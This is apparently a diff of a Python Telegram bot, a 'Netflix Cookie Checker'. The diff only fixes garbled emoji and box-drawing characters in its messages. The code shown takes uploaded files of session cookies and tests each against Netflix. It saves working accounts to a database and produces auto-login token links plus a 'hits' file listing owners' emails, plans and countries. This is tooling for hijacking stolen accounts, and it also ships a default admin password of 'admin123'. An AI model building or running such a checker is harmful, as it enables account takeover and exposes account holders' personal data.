-            f"ðŸ“± <a href=\"{res.get('mobile_url', '#')}\">Click Here to Auto-Login (Mobile)</a>\n\n"
-            f"âš ï¸ <i>Copy the link or click above to auto-login into Netflix!</i>\n"
+            f"🎬 <b>NETFLIX 1-CLICK TOKEN GENERATED</b> 🌐\n\n"
+            f"👤 <b>Account Details:</b>\n"
+            f"• <b>Email:</b> <code>{res.get('email', 'N/A')}</code>\n"
+            f"• <b>Plan:</b> {res.get('quality', 'HD')} ({res.get('streams', '?')} Screens)\n"
+            f"• <b>Country:</b> {res.get('country', 'N/A')}\n\n"
+            f"🖥️ <a href=\"{res.get('direct_url', '#')}\">Click Here to Auto-Login (PC Browser)</a>\n"
+            f"📱 <a href=\"{res.get('mobile_url', '#')}\">Click Here to Auto-Login (Mobile)</a>\n\n"
+            f"⚠️ <i>Copy the link or click above to auto-login into Netflix!</i>\n"
             f"[ BOT : @netflixpctvphonebot ]\n\n"
-            f"ðŸ“Š <b>Today's usage:</b> {usage_text}"
+            f"📊 <b>Today's usage:</b> {usage_text}"
         )
 
         markup = types.InlineKeyboardMarkup()
         if res.get("nftoken"):
             markup.row(
-                types.InlineKeyboardButton("ðŸ–¥ï¸ Direct Watch", url=res.get("direct_url")),
-                types.InlineKeyboardButton("ðŸ“± Mobile Watch", url=res.get("mobile_url")),
+                types.InlineKeyboardButton("🖥️ Direct Watch", url=res.get("direct_url")),
+                types.InlineKeyboardButton("📱 Mobile Watch", url=res.get("mobile_url")),
             )
 
         try:
@@ -1453,21 +1453,21 @@ def cmd_nftoken(message):
 
     # All attempts failed
     bot.edit_message_text(
-        "ðŸ“­ <b>Not available yet.</b>\n\n"
+        "📭 <b>Not available yet.</b>\n\n"
         "If you want to watch and have a <code>.txt</code> cookies file, "
-        "you can check it here by sending the file directly to this bot! ðŸŽ¬",
+        "you can check it here by sending the file directly to this bot! 🎬",
         chat_id=msg.chat.id,
         message_id=msg.message_id
     )
 
 
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
 #              CHECKING ENGINE
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("stop_check_"))
 def callback_stop_button(call):
-    """Handle the ðŸ›‘ Stop Checking inline button."""
+    """Handle the 🛑 Stop Checking inline button."""
     try:
         uid = int(call.data.split("stop_check_")[1])
     except (IndexError, ValueError):
@@ -1476,18 +1476,18 @@ def callback_stop_button(call):
 
     # Only the user who started the check can stop it
     if call.from_user.id != uid:
-        bot.answer_callback_query(call.id, "â›” Only the user who started can stop it.")
+        bot.answer_callback_query(call.id, "⛔ Only the user who started can stop it.")
         return
 
     if stop_flags.get(uid) is False:
         stop_flags[uid] = True
-        bot.answer_callback_query(call.id, "ðŸ›‘ Stop signal sent!")
+        bot.answer_callback_query(call.id, "🛑 Stop signal sent!")
     else:
         bot.answer_callback_query(call.id, "No active checking session.")
 
 
 def run_check(chat_id, user, bundles):
-    """Core checking loop â€” runs immediately after file is loaded."""
+    """Core checking loop — runs immediately after file is loaded."""
     active_checkers.add(user.id)
     try:
         _run_check_inner(chat_id, user, bundles)
@@ -1501,19 +1501,19 @@ def _run_check_inner(chat_id, user, bundles):
 
     def make_progress_bar(current, total, length=10):
         filled = int(length * current / total)
-        bar    = "â–ˆ" * filled + "â–‘" * (length - filled)
+        bar    = "█" * filled + "░" * (length - filled)
         pct    = int(100 * current / total)
         return f"[{bar}] {pct}%"
 
     stop_markup = types.InlineKeyboardMarkup()
-    stop_markup.add(types.InlineKeyboardButton("ðŸ›‘ Stop Checking", callback_data=f"stop_check_{user.id}"))
+    stop_markup.add(types.InlineKeyboardButton("🛑 Stop Checking", callback_data=f"stop_check_{user.id}"))
 
     status_msg = bot.send_message(
         chat_id,
-        f"â³ <b>Checking cookies...</b>\n"
+        f"⏳ <b>Checking cookies...</b>\n"
         f"{make_progress_bar(0, total)}\n"
         f"<b>(0/{total})</b>\n\n"
-        f"ðŸ”¥ Active: 0 | âš ï¸ No Plan: 0 | âŒ Dead: 0",
+        f"🔥 Active: 0 | ⚠️ No Plan: 0 | ❌ Dead: 0",
         reply_markup=stop_markup
     )
 
@@ -1536,30 +1536,30 @@ def _run_check_inner(chat_id, user, bundles):
         fname = f"@netflixpctvphonebot_{date}_{rand4}.txt"
 
         summary = (
-            f"ðŸ <b>Netflix Links Check Complete!</b>\n\n"
-            f"ðŸ“¦ <b>Total Checked  :</b> {checked_count}\n"
-            f"ðŸ”¥ <b>Active Hits    :</b> {active}\n"
-            f"âš ï¸ <b>No Plan/Free  :</b> {inactive}\n"
-            f"âŒ <b>Dead/Expired   :</b> {dead}\n"
+            f"🏁 <b>Netflix Links Check Complete!</b>\n\n"
+            f"📦 <b>Total Checked  :</b> {checked_count}\n"
+            f"🔥 <b>Active Hits    :</b> {active}\n"
+            f"⚠️ <b>No Plan/Free  :</b> {inactive}\n"
+            f"❌ <b>Dead/Expired   :</b> {dead}\n"
             f"[ BOT : @netflixpctvphonebot ]"
         )
 
         if not hits_log:
-            # No hits â€” send plain text summary only
+            # No hits — send plain text summary only
             bot.send_message(chat_id, summary)
             return
 
         # Build .txt content
         lines = []
-        lines.append("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
-        lines.append("  ðŸ”¥ NETFLIX HITS RESULT")
+        lines.append("╔══════════════════════════════════════════════════════╗")
+        lines.append("  🔥 NETFLIX HITS RESULT")
         lines.append(f"  Generated : {now.strftime('%Y-%m-%d %H:%M:%S')} UTC")
         lines.append(f"  Checked   : {checked_count} cookies")
         lines.append(f"  Active    : {len(hits_log)}")
         lines.append("  BOT       : @netflixpctvphonebot")
-        lines.append("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n")
+        lines.append("╚══════════════════════════════════════════════════════╝\n")
         for i, h in enumerate(hits_log, 1):
-            lines.append("â”€" * 54)
+            lines.append("─" * 54)
             lines.append(f"  HIT #{i}")
             lines.append(f"  Email   : {h.get('email', 'N/A')}")
             lines.append(f"  Country : {h.get('country', 'N/A')}")
@@ -1568,7 +1568,7 @@ def _run_check_inner(chat_id, user, bundles):
             lines.append(f"  Expires : {h.get('token_expiry', 'N/A')}")
             lines.append(f"  Direct  : {h.get('direct_url', 'N/A')}")
             lines.append(f"  Mobile  : {h.get('mobile_url', 'N/A')}")
-        lines.append("\n" + "â”€" * 54)
+        lines.append("\n" + "─" * 54)
         lines.append("[ BOT : @netflixpctvphonebot ]")
         content = "\n".join(lines)
 
@@ -1583,7 +1583,7 @@ def _run_check_inner(chat_id, user, bundles):
             bot.send_message(chat_id, summary)
 
     for idx, bundle in enumerate(bundles, 1):
-        # â”€â”€ Check if user requested stop â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+        # ── Check if user requested stop ───────────────
         if stop_flags.get(user.id):
             try:
                 bot.unpin_chat_message(chat_id, status_msg.message_id)
@@ -1603,23 +1603,23 @@ def _run_check_inner(chat_id, user, bundles):
                 save_hit_to_db(bundle, res, user.id)  # Save to persistent DB for NF Token
 
                 hit_text = (
-                    f"ðŸŽ¬ <b>NETFLIX HIT #{active_count}</b> ðŸŒ\n\n"
-                    f"ðŸ‘¤ <b>Account Details:</b>\n"
-                    f"â€¢ <b>Email:</b> <code>{res.get('email', 'N/A')}</code>\n"
-                    f"â€¢ <b>Plan:</b> {res.get('quality', 'HD')} ({res.get('streams', '?')} Screens)\n"
-                    f"â€¢ <b>Country:</b> {res.get('country', 'N/A')}\n"
-                    f"â€¢ <b>Status:</b> {res.get('status', 'N/A')} âœ”\n\n"
-                    f"ðŸ–¥ï¸ <a href=\"{res.get('direct_url', '#')}\">Click Here to Auto-Login (PC Browser)</a>\n"
-                    f"ðŸ“± <a href=\"{res.get('mobile_url', '#')}\">Click Here to Auto-Login (Mobile)</a>\n\n"
-                    f"âš ï¸ <i>Copy the link or click above to auto-login into Netflix!</i>\n"
+                    f"🎬 <b>NETFLIX HIT #{active_count}</b> 🌐\n\n"
+                    f"👤 <b>Account Details:</b>\n"
+                    f"• <b>Email:</b> <code>{res.get('email', 'N/A')}</code>\n"
+                    f"• <b>Plan:</b> {res.get('quality', 'HD')} ({res.get('streams', '?')} Screens)\n"
+                    f"• <b>Country:</b> {res.get('country', 'N/A')}\n"
+                    f"• <b>Status:</b> {res.get('status', 'N/A')} ✔\n\n"
+                    f"🖥️ <a href=\"{res.get('direct_url', '#')}\">Click Here to Auto-Login (PC Browser)</a>\n"
+                    f"📱 <a href=\"{res.get('mobile_url', '#')}\">Click Here to Auto-Login (Mobile)</a>\n\n"
+                    f"⚠️ <i>Copy the link or click above to auto-login into Netflix!</i>\n"
                     f"[ BOT : @netflixpctvphonebot ]"
                 )
 
                 markup = types.InlineKeyboardMarkup()
                 if res.get("nftoken"):
                     markup.row(
-                        types.InlineKeyboardButton("ðŸ–¥ï¸ Direct Watch", url=res.get("direct_url")),
-                        types.InlineKeyboardButton("ðŸ“± Mobile Watch", url=res.get("mobile_url")),
+                        types.InlineKeyboardButton("🖥️ Direct Watch", url=res.get("direct_url")),
+                        types.InlineKeyboardButton("📱 Mobile Watch", url=res.get("mobile_url")),
                     )
 
                 bot.send_message(
@@ -1638,12 +1638,12 @@ def _run_check_inner(chat_id, user, bundles):
         if idx % 5 == 0 or idx == total:
             try:
                 bot.edit_message_text(
-                    f"â³ <b>Checking cookies...</b>\n"
+                    f"⏳ <b>Checking cookies...</b>\n"
                     f"{make_progress_bar(idx, total)}\n"
                     f"<b>({idx}/{total})</b>\n\n"
-                    f"ðŸ”¥ Active: {active_count} | "
-                    f"âš ï¸ No Plan: {inactive_count} | "
-                    f"âŒ Dead: {dead_count}",
+                    f"🔥 Active: {active_count} | "
+                    f"⚠️ No Plan: {inactive_count} | "
+                    f"❌ Dead: {dead_count}",
                     chat_id=chat_id,
                     message_id=status_msg.message_id,
                     reply_markup=stop_markup
@@ -1651,22 +1651,22 @@ def _run_check_inner(chat_id, user, bundles):
             except Exception:
                 pass
 
-    # â”€â”€ Unpin progress message when done â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    # ── Unpin progress message when done ──────────────
     try:
         bot.unpin_chat_message(chat_id, status_msg.message_id)
     except Exception:
         pass
 
-    # â”€â”€ Final Summary + Hits File â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    # ── Final Summary + Hits File ──────────────────────
     send_hits_file(total, active_count, inactive_count, dead_count)
 
     pending_files.pop(user.id, None)
     stop_flags.pop(user.id, None)
 
 
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
 #                     MAIN
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
 
 if __name__ == "__main__":
     _db.init_all()
@@ -1675,7 +1675,7 @@ if __name__ == "__main__":
         os.environ.get("ADMIN_PASSWORD", "admin123")
     )
     print("=" * 50)
-    print("  Netflix Cookie Checker Bot â€” Running!")
+    print("  Netflix Cookie Checker Bot — Running!")
     print(f"  Owner ID    : {OWNER_ID}")
     print(f"  Free Trial  : {FREE_DAYS} days")
     print(f"  Hits Channel: {HITS_CHANNEL}")
